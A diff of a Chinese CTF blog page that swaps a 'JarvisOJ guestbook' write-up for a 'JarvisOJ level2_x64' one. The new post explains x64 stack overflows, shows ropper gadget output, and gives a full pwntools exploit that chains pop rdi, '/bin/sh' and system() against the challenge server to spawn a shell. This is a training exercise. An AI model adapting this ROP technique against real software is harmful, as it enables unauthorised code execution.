@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>JarvisOJ guestbook | GoldsNow</title>
+  <title>JarvisOJ level2_x64 | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+  <meta name="description" content="这个题目也是简单的栈溢出利用，但是相比32位的溢出有很大的不同">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ guestbook">
-<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/index.html">
+<meta property="og:title" content="JarvisOJ level2_x64">
+<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level_x64/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
-<meta property="og:updated_time" content="2017-03-24T02:58:51.849Z">
+<meta property="og:description" content="这个题目也是简单的栈溢出利用，但是相比32位的溢出有很大的不同">
+<meta property="og:updated_time" content="2017-03-24T12:10:31.150Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ guestbook">
-<meta name="twitter:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+<meta name="twitter:title" content="JarvisOJ level2_x64">
+<meta name="twitter:description" content="这个题目也是简单的栈溢出利用，但是相比32位的溢出有很大的不同">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -216,11 +216,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-[JarvisOJ]guestbook" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-[JarvisOJ]level_x64" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/24/[JarvisOJ]guestbook/" class="article-date">
-      <time datetime="2017-03-24T02:28:00.000Z" itemprop="datePublished">2017-03-24</time>
+      <a href="/2017/03/24/[JarvisOJ]level_x64/" class="article-date">
+      <time datetime="2017-03-24T11:35:00.000Z" itemprop="datePublished">2017-03-24</time>
 </a>
     </div>
   
@@ -233,7 +233,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      JarvisOJ guestbook
+      JarvisOJ level2_x64
     </h1>
   
 
@@ -258,10 +258,22 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v4; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">0x14</span>uLL);</div><div class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>uLL);</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以发现这里的v4只有0x88的栈空间，而可以输入的长度为0x14<br>所以存在着溢出。这个程序还有一个后面代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// rbx@1</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Fh] [bp-9h]@2</span></div><div class="line"></div><div class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    result = fgetc(v0);</div><div class="line">    buf = result;</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>记录地址为<code>0x400620</code><br>所以exp为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">addr_goodgame= <span class="number">0x400620</span></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_goodgame)</div></pre></td></tr></table></figure></p>
-
+        <p>这个题目也是简单的栈溢出利用，但是相比32位的溢出有很大的不同</p>
+<a id="more"></a>
+<p>32位的程序完全是利用堆栈来利用，但是64位的系统不是这样子的。</p>
+<p>x64函数调用时整数和指针参数按照从左到右的顺序依次保存在寄存器rdi,rsi,rdx,rcx,r8和r9中，浮点型参数保存在寄存器xmm0,xmm1……中。若有更多的参数则按照从右到左的顺序依次压入堆栈。</p>
+<p>这个程序很明显就是在buf栈这个位置会造成溢出<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line"></div><div class="line">  system(<span class="string">"echo Input:"</span>);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>buf长为0x80</p>
+<p>因为需要讲/bin/sh写入到edi中，所以需要寻找pop edi;ret</p>
+<p>用ropper 来寻找程序中的位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">~/Desktop/Jarvis oj$ ropper -f level2_x64 --search &quot;pop|rdi&quot;</div><div class="line">[INFO] Load gadgets from cache</div><div class="line">[LOAD] removing double gadgets... 100%</div><div class="line">[INFO] Searching for gadgets: pop|rdi</div><div class="line"></div><div class="line">[INFO] File: level2_x64</div><div class="line">0x00000000004006ac: pop r12; pop r13; pop r14; pop r15; ret; </div><div class="line">0x00000000004006ae: pop r13; pop r14; pop r15; ret; </div><div class="line">0x00000000004006b0: pop r14; pop r15; ret; </div><div class="line">0x00000000004006b2: pop r15; ret; </div><div class="line">0x000000000040054f: pop rbp; mov edi, 0x600a98; jmp rax; </div><div class="line">0x000000000040059d: pop rbp; mov edi, 0x600a98; jmp rax; nop dword ptr [rax]; pop rbp; ret; </div><div class="line">0x000000000040054f: pop rbp; mov edi, 0x600a98; jmp rax; nop word ptr [rax + rax]; pop rbp; ret; </div><div class="line">0x00000000004006ab: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </div><div class="line">0x00000000004006af: pop rbp; pop r14; pop r15; ret; </div><div class="line">0x0000000000400560: pop rbp; ret; </div><div class="line">0x00000000004006b3: pop rdi; ret; </div><div class="line">0x00000000004006b1: pop rsi; pop r15; ret; </div><div class="line">0x00000000004006ad: pop rsp; pop r13; pop r14; pop r15; ret;</div></pre></td></tr></table></figure>
+<p>/bin/sh 程序就给提供了。</p>
+<p>system也提供了。</p>
+<p>所以这个题目比较简单</p>
+<p><code>shellcode = &#39;A&#39;*0x80+&#39;B&#39;*0x8+addr_rop + addr_binsh+addr_system</code></p>
+<p>这样子就可以利用rop返回。</p>
+<p>最后的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level = <span class="string">"debug"</span>)</div><div class="line"><span class="comment">#p = process('./level2_x64')</span></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)</div><div class="line"></div><div class="line"></div><div class="line">addr_system = <span class="number">0x4004C0</span></div><div class="line">addr_sh = <span class="number">0x0600A90</span></div><div class="line">addr_rop =  <span class="number">0x004006b3</span></div><div class="line"></div><div class="line"></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_rop)+p64(addr_sh)+p64(addr_system)+p64(<span class="number">0</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input:'</span>)</div><div class="line"></div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
       
       
     </div>
@@ -270,13 +282,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]guestbook/">JarvisOJ guestbook</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]level_x64/">JarvisOJ level2_x64</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
-        <p><span>发布时间:</span>2017年03月24日 - 10时28分</p>
-        <p><span>最后更新:</span>2017年03月24日 - 10时58分</p>
+        <p><span>发布时间:</span>2017年03月24日 - 19时35分</p>
+        <p><span>最后更新:</span>2017年03月24日 - 20时10分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]guestbook/" title="JarvisOJ guestbook">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]level_x64/" title="JarvisOJ level2_x64">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level_x64/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level_x64/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -289,18 +301,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/03/24/[JarvisOJ]level_x64/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/03/24/[JarvisOJ]level0/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          JarvisOJ level2_x64
+          JarvisOJ level0
         
       </div>
     </a>
   
   
-    <a href="/2017/03/23/3-22 整理/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF の 套路</div>
+    <a href="/2017/03/24/[JarvisOJ]guestbook/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JarvisOJ guestbook</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -362,13 +374,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/24/[JarvisOJ]level_x64/" title="上一篇: JarvisOJ level2_x64">
+            <a href="/2017/03/24/[JarvisOJ]level0/" title="上一篇: JarvisOJ level0">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/23/3-22 整理/" title="下一篇: CTF の 套路">
+            <a href="/2017/03/24/[JarvisOJ]guestbook/" title="下一篇: JarvisOJ guestbook">
                 <i class="fa fa-angle-right"></i>
             </a>
         
